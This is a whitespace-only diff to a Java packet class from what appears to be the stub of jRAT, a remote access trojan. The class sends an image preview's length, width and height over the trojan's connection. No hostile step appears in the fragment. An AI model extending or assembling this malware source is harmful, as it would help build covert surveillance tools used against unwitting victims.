@@ -5,13 +5,12 @@ import java.io.DataOutputStream;
 import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Connection;
 
-
 public class Packet43PreviewImage extends AbstractOutgoingPacket {
 
 	private int length;
 	private int width;
 	private int height;
-	
+
 	public Packet43PreviewImage(int length, int width, int height) {
 		this.length = length;
 		this.width = width;
@@ -23,7 +22,7 @@ public class Packet43PreviewImage extends AbstractOutgoingPacket {
 		dos.writeInt(length);
 		dos.writeInt(width);
 		dos.writeInt(height);
-		
+
 		Connection.lock();
 	}
 
